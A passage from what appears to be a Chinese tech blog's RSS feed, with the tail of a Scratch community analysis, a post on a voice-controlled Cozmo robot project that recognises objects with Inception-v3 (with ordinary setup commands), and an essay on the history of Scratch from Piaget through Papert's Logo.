&lt;li&gt;引入代码片段的收藏机制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们之后会构建一个面向国内用户的scratch社区，会在那儿实践这些想法&lt;/p&gt;
&lt;h3&gt;每月评论&lt;/h3&gt;
&lt;p&gt;&lt;img alt="studio" src="http://oav6fgfj1.bkt.clouddn.com/scratch_data_aba5d56e.png" width=800 /&gt;&lt;/p&gt;
&lt;p&gt;从数据我们可以看出，社区成员之间的交流十分广泛，远不止限于讨论项目，而是深度参与其中。&lt;/p&gt;
&lt;!--
### all
https://api.scratch.mit.edu/explore/projects?limit=16&amp;offset=0&amp;language=en&amp;mode=trending&amp;q=*

### games
https://api.scratch.mit.edu/explore/projects?limit=16&amp;offset=0&amp;language=en&amp;mode=trending&amp;q=games

### popular and games
https://api.scratch.mit.edu/explore/projects?limit=16&amp;offset=0&amp;language=en&amp;mode=popular&amp;q=games

词云

---

看一下对github的分析  可视化

看不同的图表

看一个典型数据
--&gt;

&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/K%E2%80%9312"&gt;K–12&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-cn/Scratch"&gt;Scratch&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/"&gt;scratch.mit.edu&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.scratch.mit.edu/"&gt;Scratch Wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/community_guidelines"&gt;Scratch Community Guidelines&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.just4fun.site/whiplash.html"&gt;读书摘记 爆裂&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.scratch-wiki.info/wiki/Front_Page"&gt;scratch-wiki Front Page&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.scratch-wiki.info/wiki/Studio"&gt;scratch-wiki Studio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.scratch-wiki.info/wiki/Explore"&gt;scratch-wiki Explore&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/20690652"&gt;什么叫feed流？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/%E7%B6%B2%E8%B7%AF%E7%88%AC%E8%9F%B2"&gt;网络爬虫&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/statistics/"&gt;scratch statistics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/studios/4982024/"&gt;Earth Day 2018&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/studios/5047558/"&gt;Scratch Day Celebrations!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;!--    
爆裂中关于社区的讨论：
    *  由权威向“涌现”的转变中，另外一个重要因素便是免费和便宜的在线教育和社区教育的普及。这不仅包括edX等正式课程，也包括可汗学院（Khan Academy）等教育网站、创客空间（hackerspaces）的实践课、通过网络开展的或面对面的非正式同伴辅导等。人们学习新技能的机会越多，创新能力就越强
    *  弱连接——连接点头之交和朋友的朋友——在连接社区和创造陌生人之间的信任和联系方面有巨大的潜力。因此，具有广泛弱连接的人有更多机会从他们的人际关系网络中获取资源。正如马尔康姆·格拉德维尔（Malcolm Gladwell）指出的，我们的点头之交是我们获取新想法和资讯的最大来源。
    *  扎克发现了这个软件大受欢迎背后的真正原因：一个全球范围的孩子社区，他们在其中分享建议、评论，同时支持Scratch的一项特殊功能——合成（Remix），即他们作品背后的源代码。
--&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 18 Jul 2018 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2018-07-18:scratch-community-analyze.html</guid><category>scratch</category></item><item><title>Cozmo what is this</title><link>/cozmo_what_is_this.html</link><description>&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;Cozmo官方在11月15号发&lt;a href="https://developer.anki.com/blog/news/cozmo-code-lab/"&gt;博文&lt;/a&gt;称2017.12.05号这天将会发布一个大版本，在这个版本中Code Lab将会得到极大的增强，最大的更新是界面中将增加Constructor Mode。&lt;/p&gt;
&lt;p&gt;它长这样:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="https://i0.wp.com/developer.anki.com/app/uploads/2017/11/Codelab-Vert_TinyOrchestra_UI_Zoom-IN.jpg?resize=1024%2C768&amp;amp;ssl=1" /&gt;&lt;/p&gt;
&lt;p&gt;Constructor Mode增加了更多的编程积木，包括条件语句、数学操作符、变量函数等等，高阶用户将能做出更具表现力的东西。&lt;/p&gt;
&lt;p&gt;而原先基于图标的编程界面也将保留，对于低龄用户和新手，它更为友好和直观。&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="https://i2.wp.com/developer.anki.com/app/uploads/2017/11/code-lab.png?resize=1024%2C768&amp;amp;ssl=1" /&gt;&lt;/p&gt;
&lt;p&gt;顺便一提，如此惊艳而流畅的操作界面基于scratch3.0。&lt;/p&gt;
&lt;p&gt;我数着日子等呀等，到了12.04号，一早跑到二楼南书房，打开Google Play，心想官方说不定想给大家一个惊喜，提前一天发布了更新。于是我有些手抖地在Google Play输入Cozmo，等待进度条加载的时候，就像等待期末考试突击科目的成绩，真是坐立难安，恨不能找个插件以刮奖的方式查看结果。&lt;/p&gt;
&lt;p&gt;哈，还好没更新，不然我都没有做好心理准备，要怎么来表现我的开心。这就像表白的时候，心理有个声音说拒绝我吧拒绝我吧，不然我开心得不知道下一步该干嘛。&lt;/p&gt;
&lt;p&gt;这样一来我就有足足一天的时间迎接cozmo的大版本更新！我打开之前用Cozmo Python SDK写过的项目，突然想到大版本更新之后，对我之前的作品不兼容怎么办？&lt;/p&gt;
&lt;p&gt;我赶紧整理了一下做过的好玩项目，趁它更新之前，发布到&lt;a href="https://github.com/wwj718/Cozmo-What-Is-This"&gt;github&lt;/a&gt;和&lt;a href="https://forums.anki.com/t/cozmo-what-is-this-use-inception-v3-model-to-identify-objects/11059"&gt;官方论坛&lt;/a&gt;里。&lt;/p&gt;
&lt;h1&gt;Cozmo what is this&lt;/h1&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmodc8e1dad.png" /&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;- Cozmo, what is this ?
- Let me see! Oh, it is the coffee mug.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们来看看实际效果。（只录了cozmo回答的部分，声音可能有点小，记得调大你的音量呢。）&lt;/p&gt;
&lt;video src="http://os54tv4fc.bkt.clouddn.com/1512735476179.mp4" controls="controls"&gt;&lt;/video&gt;

&lt;p&gt;我来简单介绍一下这个项目。一开始，Cozmo安静地呆在桌子上，你可以向它发号施令，Cozmo虽然脾气有点坏，不过目前还不会像吴克群那样抱怨说:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;我是个小兵
我绷紧了神经
在战场上拼命
听谁在发号施令
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所以你可以放心命令它左走右走，前进后退。如果你愿意你还可以问它:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;能不能为我再跳一支舞，你记否千百年前借伞的西湖。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我很恶俗地改了歌词。为了让它跳舞，你只要说:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;cozmo dances.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ps: 我为它增加了中文支持，目前的语义处理很弱，所以你说出我上边那段恶俗的歌词，它可能还真会为你跳一支舞 :)&lt;/p&gt;
&lt;p&gt;我们可以发号施令，让cozmo在桌子上四处游荡，当它来到一个咖啡杯面前时，你可以问它:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Cozmo, what is this?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;它会站在咖啡杯面前，若有所思说:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Let me see... Oh, it is the coffee mug.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如此一来你可以让Cozmo在屋子里来回走动，询问它都看到些什么。&lt;/p&gt;
&lt;p&gt;目前我已经把项目源码放在了github上:&lt;a href="https://github.com/wwj718/Cozmo-What-Is-This"&gt;Cozmo-What-Is-This&lt;/a&gt;,同时也发到了Cozmo官方社区里:&lt;a href="https://forums.anki.com/t/cozmo-what-is-this-use-inception-v3-model-to-identify-objects/11059"&gt;Cozmo What Is This: use Inception-v3 model to identify objects&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;社区里有个国外小哥，run了这个项目，还录了视频发到了YouTube:&lt;a href="https://www.youtube.com/watch?v=L1GTnhmoxXA"&gt;cozmo AI voice command and image recognition&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;如果你访问不了YouTube也没关系，因为这个小哥拍的实在有点烂，我原本想跟他说你在视频下放上我的源码库链接吧，这样其他感兴趣的小伙伴可以自己run起来。后来看了视频后，觉得还是不要让大家知道这个视频与我的项目有关为好。&lt;/p&gt;
&lt;h3&gt;灵感来自组合&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/wwj718/Cozmo-What-Is-This"&gt;Cozmo-What-Is-This&lt;/a&gt;实际组合了社区里的两个项目。&lt;/p&gt;
&lt;p&gt;其一是CrowdFlower的创始人Lukas之前做过的一个爆款项目: &lt;a href="https://www.oreilly.com/learning/how-to-build-a-robot-that-sees-with-100-and-tensorflow"&gt;How to build a robot that “sees” with $100 and TensorFlow&lt;/a&gt;，这个项目让树莓派机器人在屋子里游荡，每当看到什么东西在面前，它就会说 "I am thinking... it is xxx", 这个机器人好像一个吟游诗人，在它所行之处，赋予所见之物以名字。&lt;/p&gt;
&lt;p&gt;这个机器人在说"I am thinking..."的时候，我简直被为作者的机智所折服。该项目用到了inception-v3 model，树莓派上跑神经网络很慢，于是作者在让机器人先说出"I am thinking...",这段时间树莓派实际是在缓慢地跑神经网络模型来识别拍摄的图片，而观众会以为机器人真的在思考（因为它就是那样说的啊，而且还真的低头沉思），尽管时间有点久，大家的好奇心反而加重，不会表现出不耐烦，等它终于说出正确的结果，观众会觉得刚才果真是在深思呢！（《银河系漫游指南》里deepThought在回答&lt;code&gt;The answer to life, universe and everything is 42&lt;/code&gt;可是用了750万年 : ）&lt;/p&gt;
&lt;p&gt;"I am thinking..."这个心理学小技巧也被我纳入到&lt;a href="https://github.com/wwj718/Cozmo-What-Is-This"&gt;Cozmo-What-Is-This&lt;/a&gt;项目里。&lt;/p&gt;
&lt;p&gt;由于Lukas没有开放源代码，我自己复现了这个项目的核心部分,有兴趣的同学可以戳这里:&lt;a href="http://blog.just4fun.site/raspberrypi-tensowflow-robot.html"&gt;基于树莓派和Tensowflow的物体识别-brain&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;灵感来源的第二个项目是&lt;a href="https://github.com/rizal72/Cozmo-Voice-Commands"&gt;Cozmo-Voice-Commands&lt;/a&gt;
,这个项目写的很棒，让Cozmo能接收语音指令。&lt;/p&gt;
&lt;p&gt;这个项目也是&lt;a href="https://github.com/wwj718/Cozmo-What-Is-This"&gt;Cozmo-What-Is-This&lt;/a&gt;的基础骨架，我fork了它，整个控制流程用的是该项目，在原本的基础上我做了两个工作:其一是加入中文支持(目前加上中文之后，一共支持5门语言)；其二是加入了&lt;code&gt;cozmo what is this&lt;/code&gt;这条语音指令。&lt;/p&gt;
&lt;p&gt;这种组合已有的社区项目，在它们基础上去实现自己的想法，是开源社区常见的做法。有人统计过，github上代码重复率很高，对这个研究有兴趣的朋友可以戳这篇论文:&lt;a href="http://link.zhihu.com/?target=http%3A//janvitek.org/pubs/oopsla17b.pdf"&gt;A Map of Code Duplicates on GitHub&lt;/a&gt;，研究称&lt;code&gt;GitHub 上 82% 的代码是重复代码&lt;/code&gt;，我觉得是一件好事，说明大家都在高效地复用代码，而不是闭上门来钻木取火。&lt;/p&gt;
&lt;h1&gt;run it&lt;/h1&gt;
&lt;p&gt;接下来假设你也是一个Cozmo玩家，我来教你如何把这个项目跑起来。&lt;/p&gt;
&lt;p&gt;首先你当然得有一台Cozmo ， 没有的同学可以关上电脑洗洗睡了 ：）&lt;/p&gt;
&lt;h3&gt;1.安装Cozmo Python SDK&lt;/h3&gt;
&lt;p&gt;Cozmo Python SDK的安装方法&lt;a href="http://cozmosdk.anki.com/docs/"&gt;官方文档&lt;/a&gt;里写的很详细,结合你的操作系统和移动设备,跟着教程来即可。如果你在安装的过程有遇到什么困难，可以到社区里求助，当然也可以给我发邮件，我会尽量为你提供帮助。&lt;/p&gt;
&lt;h3&gt;2.安装portaudio&lt;/h3&gt;
&lt;p&gt;安装方式根据你的操作系统不同而不同。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MacOS:  &lt;code&gt;brew install portaudio&lt;/code&gt; (当然你首先需要安装了&lt;a href="http://brew.sh/index_it.html"&gt;Homebrew&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Linux:  &lt;code&gt;sudo apt-get install flac portaudio19-dev python-all-dev python3-all-dev &amp;amp;&amp;amp; pip3 install --user PyAudio&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Windows: 你需要安装一下&lt;a href="https://git-scm.com/download/win"&gt;git&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;3.克隆项目&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;git clone https://github.com/wwj718/Cozmo-What-Is-This&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;4.安装依赖&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd Cozmo-What-Is-This
pip install -r requirements.txt (python3.5 virtual env)
python classify_image.py --model_dir tf/imagenset/
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;就绪&lt;/h2&gt;
&lt;p&gt;一切就绪，就可以运行这个项目啦: &lt;code&gt;python cvc.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之后程序让你选择使用一门语言来控制Cozmo。（我一般用英文或中文）&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmoec2ddcfe.png" /&gt;&lt;/p&gt;
&lt;p&gt;现在你可以问Cozmo：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Cozmo, what is this?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;小不点，这是什么&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;感觉&lt;code&gt;小不点&lt;/code&gt;不大好听，起名果然是最难的事情之一，岂止是为变量起名。&lt;/p&gt;
&lt;p&gt;Enjoy yourself :)&lt;/p&gt;
&lt;h1&gt;Todo&lt;/h1&gt;
&lt;p&gt;我准备把唤醒词和判断语音终止的功能加入这个项目里，如此一来交互过程将更为自然。这块的功能去扒智能音响类项目的代码就好了,&lt;a href="https://github.com/wzpan/dingdang-robot"&gt;dingdang-robot&lt;/a&gt;是个不错的选择，代码清晰明了。我最近比较忙，如果你提前做好了，到时候给我提个PR呢 : )&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 08 Dec 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-12-08:cozmo_what_is_this.html</guid><category>cozmo</category></item><item><title>Scratch的前世今生</title><link>/scratch.html</link><description>&lt;blockquote&gt;
&lt;p&gt;学习编程能帮你组织、表达和分享你的想法，就像学习写作一样。这对于所有人来说都很重要&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="" src="https://wiki.scratch.mit.edu/w/images/Scratch_3.0_Prototype.png" /&gt;&lt;/p&gt;
&lt;h1&gt;前言&lt;/h1&gt;
&lt;h3&gt;人海擦肩&lt;/h3&gt;
&lt;p&gt;说起Scratch，很早就有注意到它，它时常以不同方式出现在视野里，从知乎编程入门类问题的回答，到树莓派里自带的教育软件，以及各种玩具的操作界面，都有它的身影。&lt;/p&gt;
&lt;p&gt;Scratch的反复刷脸成功引起了我的注意，曾经试着用过一段时间，对其的理解却一致停留在"图形化编程，拖拖拽拽，可以做游戏和动画，更像玩具，而不是严肃的编程"。（从编程语言的历史来看，每当有新的编程语言／范式出现，"更像玩具，而不是严肃的编程"这句话以各种表述形式伴随着出现:）&lt;/p&gt;
&lt;p&gt;当你谈及Scratch，我脑子里浮现出基于Scratch的学生作品，如果要对它们做个贴便签式的群嘲，我大概会选"画风简陋而随意"&lt;/p&gt;
&lt;p&gt;于是对于它的流行(已翻译成 40 种以上的语言，在超过 150 个国家上被使用，在过去的一年里，平均每月新增人数为 53 万，平台已经发布的共享程序超过 2233 万个)，我更多抱着一种"时无英雄使竖子成名“的态度&lt;/p&gt;
&lt;h3&gt;路转粉&lt;/h3&gt;
&lt;p&gt;我从路人转为Scratch粉丝，主要因为&lt;a href="https://zh.wikipedia.org/wiki/%E4%BC%8A%E8%97%A4%E7%A9%B0%E4%B8%80"&gt;伊藤穰一&lt;/a&gt;(Joi Ito)的《爆裂》(Whiplash：How to Survive Our Faster Future) 一书（ps：近期在Cozmo Code Lab中的编程体验也让我对Scratch好感倍增）&lt;/p&gt;
&lt;p&gt;伊藤穰一现任MIT Media Lab（麻省理工媒体实验室）主管，而Scratch诞生自MIT Media Lab "终生幼儿园"（Lifelong Kindergarten）小组，《爆裂》一书以一种内部视角，向我们揭示了Scratch的诞生过程、初心和设计原则。&lt;/p&gt;
&lt;p&gt;从4P(Projects, Passion, Peers, and Play)到"低门槛，高天花板，宽围墙"的设计理念，以及Scratch对这些理念的实践，无不令我震惊和心动. &lt;/p&gt;
&lt;h1&gt;历史沿革&lt;/h1&gt;
&lt;h3&gt;台上台下&lt;/h3&gt;
&lt;p&gt;1982年春天，偶然的机会，有一位青年记者听了Logo编程语言发明者&lt;a href="https://en.wikipedia.org/wiki/Seymour_Papert"&gt;西摩·派珀特(Seymour Papert)&lt;/a&gt;的一次主题演讲。这次演讲完全改变了他对计算机的认知。&lt;/p&gt;
&lt;p&gt;大部分人谈论计算机的方式都是将计算机当成工具，一种完成任务的方法，但在派珀特眼中，计算机能帮助我们用全新的方式认识世界，它将成为儿童表达想法的媒介&lt;/p&gt;
&lt;p&gt;故事听起来颇有武侠小说开篇的味道。台上道骨仙风的开山鼻祖，台下骨骼清秀的求知青年，一段演讲中完成了衣钵传承&lt;/p&gt;
&lt;p&gt;次年，这位青年拿到MIT一年期的奖学金，于是他报名参加了派珀特的研讨班，并被深深吸引。在这里一待就是三十寒暑。&lt;/p&gt;
&lt;p&gt;当时台下的那个青年记者，便是后来的"Scratch之父" -- &lt;a href="https://en.wikipedia.org/wiki/Mitchel_Resnick"&gt;米奇·雷斯尼克(Mitchel Resnick)&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;派珀特与Logo语言&lt;/h3&gt;
&lt;p&gt;雷斯尼克创造的Scratch受派珀特和他的Logo语言影响至深，派珀特对计算机的看法对他的影响则更为深刻。这些我们放在后边再说，现在来说说派珀特和他的传承。&lt;/p&gt;
&lt;p&gt;派珀特是近代人工智能领域的先驱者之一，20世纪60年代初，他与&lt;a href="https://zh.wikipedia.org/wiki/%E9%A9%AC%E6%96%87%C2%B7%E9%97%B5%E6%96%AF%E5%9F%BA"&gt;马文·明斯基&lt;/a&gt;在MIT创办了人工智能实验室(Artificial Intelligence Laboratory)，他们还合著过 Perceptrons 一书，，当今深度学习三大权威之一Yann LeCun在读大学的时候因为听说了「perceptron」的概念，激发了对学习型机器的热情，派珀特可算他的启蒙老师。&lt;/p&gt;
&lt;p&gt;派珀特也是前边提到的MIT Media Lab创建者之一，且一直在该实验室工作&lt;/p&gt;
&lt;p&gt;他曾师从瑞士哲学家、心理学家&lt;a href="https://zh.wikipedia.org/wiki/%E8%AE%93%C2%B7%E7%9A%AE%E4%BA%9E%E5%82%91"&gt;让·皮亚杰&lt;/a&gt;，皮亚杰曾说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;从来没有人能够象西摩·派珀特那样理解我的思想&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1958——1963年，派珀特和皮亚杰在日内瓦大学共事。皮亚杰将84年人生中的大部分时间和精力都花在了研究儿童或者进一步说成年人是如何形成对世界的认识上面。人类从幼年开始构建不同的心智模式（mental model）解释自己周围的现象，比如加速的汽车、猫粗糙的舌头。随着逐渐长大，我们的经验和这些模式产生碰撞，迫使我们调整模式以适应不断变化的现实。如此说来，儿童玩耍就是不断创建和再创建自己心智模式的行为，以此更好地认识世界&lt;/p&gt;
&lt;p&gt;对于派珀特来说，计算机可以对照这些模式和经验，是兼顾玩耍和学习的完美载体。派珀特将皮亚杰的这些理念融入Logo语言（他在1968年从LISP语言的基础里创立Logo编程语言）：比如，孩子认识到通过几行简单的代码可以让屏幕上的光标画出一个正方形，甚至是一朵花。如果这样做，就会出现那样的画面。最有价值的是，他们也会认识到，有时这样做可能不会出现那样的画面，这时他便主动寻求身旁的程序员的帮助。这个过程就是提出一种假设，然后去验证，再去修正得到新的假设。通过Logo语言，每个孩子都可以变成经验主义者。&lt;/p&gt;
&lt;p&gt;他在其著作《头脑风暴：儿童、计算机及充满活力的创意》（Mindstorms:Children, Computers, and PowerfulIdeas）中，系统阐述了自己的建构主义观: "在制作中学习"（Learning by making），在他看来，好的教育不是如何让老师教得更好，而是如何提供充分的空间和机会让学习者去构建自己的知识体系(伊藤穰一也提到: 学习而不是教育)。当孩子们在制作一些对自己有意义的作品时，如编故事、编程序、或是音乐创作时，孩子们正处于学习知识的最佳状态。他被自己的热情所驱动，主动地去获取知识而不是痛苦地被填鸭。关于这点雷斯尼克在他的一个TED演讲中有动人的例子: &lt;a href="https://www.ted.com/talks/mitch_resnick_let_s_teach_kids_to_code"&gt;Let's teach kids to code&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;米奇·雷斯尼克后来成了派珀特的学生，他评价说:"派珀特是第一个预见计算机可以用来帮助孩子们学习的人,他相信计算机可以让孩子们主动构建知识"&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E8%AE%93%C2%B7%E7%9A%AE%E4%BA%9E%E5%82%91"&gt;让·皮亚杰&lt;/a&gt;与儿童心理学&lt;/h3&gt;
&lt;p&gt;前头说到Scratch之父雷斯尼克 对计算机和编程教育的理解 受派珀特和他的Logo语言的影响很深，而派珀特在创造Logo语言的时候，则主要是受皮亚杰的启发，并将他的思想融入到Logo语言中。那么我们自然追溯到&lt;a href="https://zh.wikipedia.org/wiki/%E8%AE%93%C2%B7%E7%9A%AE%E4%BA%9E%E5%82%91"&gt;让·皮亚杰&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;让·皮亚杰自1921年开始从事儿童心理学的研究，从智能的早期形态入手，目的在于由此探讨认知论的问题。&lt;/p&gt;
&lt;p&gt;我最近在读他的《发生认识论原理》，这本书论述了认识是怎样形成的，智力是怎么发展、构建的。于我而言，这本书内容十分新颖（不过阅读体验并不好，作者对一些哲学内容的表述，远没有罗素式的清晰和友好），在认识论方面，我之前受洛克、休谟（经验论者）影响较多，而皮亚杰在这本书的英译本序言里说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我不是经验论者&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但他认同洛克、休谟、斯宾诺莎这些经验论者创立的"伟大传统"，即把对认识的分析放在研究认识的心理发展这个基础之上。令皮亚杰遗憾的是经验论者竟然没有进行详细的实验，而这个正是皮亚杰的前进的方向。&lt;/p&gt;
&lt;p&gt;之后皮亚杰在丰富的实验基础上，阐释他的认识论，他把结构主义与建构主义紧密地结合起来。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;认知的结构既不是在客体中预先形成了的，因为这些客体总是被同化到那些超越了客体之上的逻辑数学框架中去，也不是在必须不断地进行重新组织的主体中预先形成了的。因此，认识的获得必须用一个将结构主义和建构主义紧密的结合起来的理论来说明，也就是说，每一个结构都是心理发生的结果，而心理发生就是从一个较初级的结构过渡到一个较复杂的结构。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;皮亚杰把适应看作智力的本质，他把儿童看成建造自己的个人知识理论的小哲学家和科学家。他认为活动即是感知的源泉，又是思维发展的基础。&lt;/p&gt;
&lt;p&gt;从皮亚杰的理论里，我们可以看到Logo和Scratch的世界观和灵魂所在：对活动/交互的重视、让孩子在玩耍中不断创建和调整心智模式。&lt;/p&gt;
&lt;p&gt;尽管Logo有各种分支和方言，尽管Scratch经历了几次技术变革(即将迎来3.0版本)，也许在将来，从外表上你甚至不能一眼认出他们。但他们内核的东西一直如初：对皮亚杰认知理论的实践，将计算机作为一种理想的媒介，让孩子们在活动中去构建和调整心智模型。以理解和适应外部环境&lt;/p&gt;
&lt;p&gt;皮亚杰对计算机的影响远不只在编程教育这个领域。除了派普特根据皮亚杰的理论开发了Logo编程语言之外。Alan Kay以皮亚杰的理论为基础，开发了Dynabook编程概念。以上这两项技术，都是现今我们日常使用的图形使用者界面（GUI）的基础技术，使电脑从文字界面过渡至图形界面，改写了电脑技术的发展路向。&lt;/p&gt;
&lt;h1&gt;青出于蓝&lt;/h1&gt;
&lt;p&gt;前边我们沿着理念传承这条线，一路从雷斯尼克的Scratch追溯到派珀特的Logo语言，之后抵达皮亚杰的认知论（再往前甚至将追溯到洛克的经验论）&lt;/p&gt;
&lt;p&gt;接着我们横向来看看Scratch对他同一谱系的前辈LOGO语言做了那些改进&lt;/p&gt;
&lt;p&gt;雷斯尼克认为Scratch从Logo语言止步的地方继续前进，将Logo语言带入未来，他们的传承关系可想而知，相似之处且多于不同。&lt;/p&gt;
&lt;h3&gt;Scratch对Logo的改进&lt;/h3&gt;
&lt;h4&gt;更加直观&lt;/h4&gt;
&lt;p&gt;Scratch基于图形化的编程方式，通过拖拽、拼搭积木的方式，让整个编程过程十分直观，很像在玩乐高积木。这并不是偶然，雷斯尼克一直与乐高公司保持密切合作，乐高机器人便是他与导师派珀特密切合作研发的。乐高积木对Scratch的影响很深，或者说它们彼此影响很深&lt;/p&gt;
&lt;p&gt;关于这一点在Scratch诞生之前给国家科学基金会提交了一份&lt;a href="http://web.media.mit.edu/~mres/papers/scratch-proposal.pdf"&gt;提案&lt;/a&gt;里可以看出。其中提到他们在乐高机器人这块的研究工作将帮助他们构建Scratch&lt;/p&gt;
&lt;p&gt;这份提案里还指出&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This approach eliminates the possibility of syntax errors (which have proven to be a major obstacle for learning text-based languages)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;基于文本的编程可能带来的语法错误正是孩子们入门编程的主要困难所在。基于图形化的Scratch能避开这点&lt;/p&gt;
&lt;p&gt;这份提案有许多有趣的地方，诸如为了让Scratch卓有成效，需要做到的几点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这个工具得与孩子们的感兴趣和有热情的事情产生关联，他们才会认为这个工具很酷&lt;/li&gt;
&lt;li&gt;孩子们要能一眼就看到工具的价值和潜力(不必费劲地琢磨)&lt;/li&gt;
&lt;li&gt;可以很方便地用它创建第一个项目（低门槛）&lt;/li&gt;
&lt;li&gt;可以创建出向他人炫耀的作品&lt;/li&gt;
&lt;li&gt;能支持不同类型的活动（宽围墙）&lt;/li&gt;
&lt;li&gt;能吸引不同背景、文化的孩子&lt;/li&gt;
&lt;li&gt;可以逐步(渐进式)学习工具的特性（不必一次学完）&lt;/li&gt;
&lt;li&gt;随着时间的推移，可以越来越复杂地使用这个工具（高天花板）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这份提案在2003年提到的这些理念和设计思路在今天看来很是很有启发性，十分值得一读！&lt;/p&gt;
&lt;h4&gt;更宽的围墙&lt;/h4&gt;
&lt;p&gt;Logo语言的特色是派珀特所说的“低门槛”（易于学习）和雷斯尼克所称的“宽围墙”（不束缚儿童的想象）&lt;/p&gt;
&lt;p&gt;相比于Logo，Scratch的围墙则更宽，你可以在其中做更多你想做的事&lt;/p&gt;
&lt;p&gt;除了控制角色移动、画画之外，你还可以创作你自己的音乐、故事、电影、动画或者游戏&lt;/p&gt;
&lt;p&gt;并不是每个孩子的兴趣都一样，作为一个优秀的工具，应该把“围墙”做宽，而不应该把孩子围在一个狭小的区域里，你应该给他整个游乐场，而不是一间活动室&lt;/p&gt;
&lt;p&gt;关于"宽围墙"的意义，&lt;a href="http://learn.media.mit.edu/lcl/"&gt;Learning Creative Learning&lt;/a&gt; &lt;a href="http://learn.media.mit.edu/lcl/weeks/week5/"&gt;第五周的课里&lt;/a&gt;讲的很清楚&lt;/p&gt;
&lt;h4&gt;更丰富的媒介和更强的表现力&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Taking advantage of the extraordinary processing power of current computers, Scratch will support new programming paradigms and activities that were previously infeasible, making it much better positioned to succeed than previous initiatives to introduce programming to youth.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;计算机技术日新月异，Logo并没有跟上时代，Scratch试图将更多的多媒体元素吸收进来，以便孩子们能轻易地创作更具表现力的作品，"可以向他人炫耀的作品"&lt;/p&gt;
